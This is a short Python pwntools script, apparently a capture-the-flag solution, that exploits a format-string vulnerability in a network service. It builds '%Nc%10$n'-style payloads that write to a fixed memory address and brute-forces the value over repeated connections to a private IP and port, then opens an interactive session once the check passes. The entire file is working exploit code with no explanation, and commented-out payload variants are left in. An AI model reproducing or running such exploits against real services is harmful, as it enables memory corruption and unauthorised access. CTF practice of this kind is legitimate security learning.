from pwn import *
# context.log_level="debug"

def genpayload(sh,key):
    #%1c%10$p
    #%111c%11$naaa
    position=p32(134520876)
    payload=f'%{key}c'
    length=len(payload)
    if length==2:
        payload+='%10$naa'
    elif length==3:
        payload+="%10$na"
    elif length==5:
        payload+="%11$naaa"
    else:
        payload+="%10$n"
    payload=payload.encode()
    payload+=position
    # payload=b"t%9$naa"+position
    # payload=b"t%9$s"+position
    sh.sendlineafter(b'give me your name!\n',payload)
    sh.recvuntil(b'\n')
    res=sh.recvuntil(b'\n')
    return res
    # sh.interactive()
for i in range(999):
    sh=remote("192.168.2.236",33894)
    res=genpayload(sh,i)
    if b'false' not in res:
        print(res)
        sh.interactive()
        break
    sh.close()
# sh=remote("192.168.2.236",33894)
# position=p32(134520876)
# payload=b"%9$na"+position
# sh.sendlineafter(b'give me your name!\n',payload)
# sh.interactive()
"t%9$pbbbb"